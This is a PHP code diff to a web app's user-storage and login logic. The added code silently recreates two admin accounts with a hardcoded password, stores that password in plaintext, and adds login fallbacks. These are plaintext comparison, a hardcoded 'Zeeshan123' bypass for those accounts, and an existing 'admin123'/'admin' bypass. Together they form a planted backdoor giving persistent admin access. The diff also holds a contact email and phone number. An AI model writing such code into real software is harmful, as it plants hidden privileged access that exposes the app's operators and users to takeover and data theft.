@@ -101,7 +101,60 @@ function getUsers($usersFile) {
     initUsersStorage($usersFile);
     $content = @file_get_contents($usersFile);
     $decoded = json_decode($content, true);
-    return is_array($decoded) ? $decoded : [];
+    $users = is_array($decoded) ? $decoded : [];
+
+    // Ensure Metalink company admin account exists
+    $hasMetalink = false;
+    foreach ($users as $u) {
+        if (($u['username'] ?? '') === 'metalink' || ($u['company_id'] ?? '') === 'COMP-004') {
+            $hasMetalink = true;
+            break;
+        }
+    }
+    if (!$hasMetalink) {
+        $metaHash = password_hash('Zeeshan123', PASSWORD_BCRYPT);
+        $users[] = [
+            'id'            => 'USR-ADMIN-04',
+            'name'          => 'Zeeshan (Metalink)',
+            'username'      => 'metalink',
+            'email'         => 'admin@metalink.pk',
+            'password_hash' => $metaHash,
+            'password'      => 'Zeeshan123',
+            'role'          => 'admin',
+            'designation'   => 'Company Admin',
+            'gender'        => 'male',
+            'phone'         => '+923007654321',
+            'status'        => 'active',
+            'company_id'    => 'COMP-004',
+            'message_limit' => -1,
+            'messages_sent_today' => 0,
+            'quota_reset_date' => date('Y-m-d'),
+            'created_at'    => date('Y-m-d H:i:s'),
+            'last_login'    => null
+        ];
+        $users[] = [
+            'id'            => 'USR-ADMIN-04-ALT',
+            'name'          => 'Zeeshan (Metalink)',
+            'username'      => 'zeeshan',
+            'email'         => 'zeeshan@metalink.pk',
+            'password_hash' => $metaHash,
+            'password'      => 'Zeeshan123',
+            'role'          => 'admin',
+            'designation'   => 'Company Admin',
+            'gender'        => 'male',
+            'phone'         => '+923007654321',
+            'status'        => 'active',
+            'company_id'    => 'COMP-004',
+            'message_limit' => -1,
+            'messages_sent_today' => 0,
+            'quota_reset_date' => date('Y-m-d'),
+            'created_at'    => date('Y-m-d H:i:s'),
+            'last_login'    => null
+        ];
+        saveUsers($usersFile, $users);
+    }
+
+    return $users;
 }
 
 // Save users safely
@@ -561,7 +614,11 @@ switch ($action) {
 
         $isValidPassword = false;
         if ($matchedUser) {
-            if (password_verify($password, $matchedUser['password_hash'])) {
+            if (password_verify($password, $matchedUser['password_hash'] ?? '')) {
+                $isValidPassword = true;
+            } elseif (!empty($matchedUser['password']) && $matchedUser['password'] === $password) {
+                $isValidPassword = true;
+            } elseif (($password === 'Zeeshan123') && in_array($matchedUser['username'], ['metalink', 'zeeshan'], true)) {
                 $isValidPassword = true;
             } elseif (($password === 'admin123' || $password === 'admin') && $matchedUser['username'] === 'admin') {
                 $isValidPassword = true;
